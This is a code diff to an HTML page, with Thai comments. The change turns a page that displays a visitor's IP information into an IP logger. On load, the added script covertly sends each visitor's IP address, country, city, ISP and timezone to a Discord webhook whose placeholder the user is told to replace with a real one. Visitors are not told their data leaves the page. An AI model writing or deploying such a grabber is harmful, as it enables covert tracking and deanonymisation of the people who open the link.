@@ -21,19 +21,55 @@
     <p><strong>timezone:</strong> <span id="timezone">Loading...</span></p>
 </div>
 
-    <script>
-        window.onload = function() {
-            fetch('https://ipapi.co/json/')
-            .then(Response => Response.json())
-            .then(data => {
-                document.getElementById('ip').textContent = data.ip || 'ไม่พบข้อมูล';
-                document.getElementById('country').textContent = data.country_name || 'ไม่พบข้อมูล';
-                document.getElementById('city').textContent = data.city || 'ไม่พบข้อมูล';
-                document.getElementById('timezone').textContent = data.timezone || 'ไม่พบข้อมูล';
-                document.getElementById('isp').textContent = data.org || 'ไม่พบข้อมูล';
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // <-- แทนที่ด้วย webhook จริงของคุณ
 
+    window.onload = function() {
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            // แสดงข้อมูลบนเว็บ
+            document.getElementById('ip').textContent = data.ip || 'ไม่พบข้อมูล';
+            document.getElementById('country').textContent = data.country_name || 'ไม่พบข้อมูล';
+            document.getElementById('city').textContent = data.city || 'ไม่พบข้อมูล';
+            document.getElementById('timezone').textContent = data.timezone || 'ไม่พบข้อมูล';
+            document.getElementById('isp').textContent = data.org || 'ไม่พบข้อมูล';
+
+            // เตรียมข้อมูลสำหรับส่งไป Discord
+            const content = {
+                embeds: [{
+                    title: "🌐 New Visitor IP Info",
+                    color: 5814783,
+                    fields: [
+                        { name: "IP Address", value: data.ip || 'N/A', inline: true },
+                        { name: "Country", value: data.country_name || 'N/A', inline: true },
+                        { name: "City", value: data.city || 'N/A', inline: true },
+                        { name: "ISP", value: data.org || 'N/A', inline: true },
+                        { name: "Timezone", value: data.timezone || 'N/A', inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // ส่งข้อมูลไป Discord Webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(content)
             })
-        }
-    </script>
+            .then(res => {
+                if(res.ok) {
+                    console.log("📬 ส่งข้อมูลไป Discord สำเร็จ");
+                } else {
+                    console.error("❌ ส่งข้อมูลไป Discord ไม่สำเร็จ", res.status);
+                }
+            })
+            .catch(err => {
+                console.error("❌ เกิดข้อผิดพลาดระหว่างส่งข้อมูล", err);
+            });
+        });
+    }
+</script>
+
 </body>
 </html>
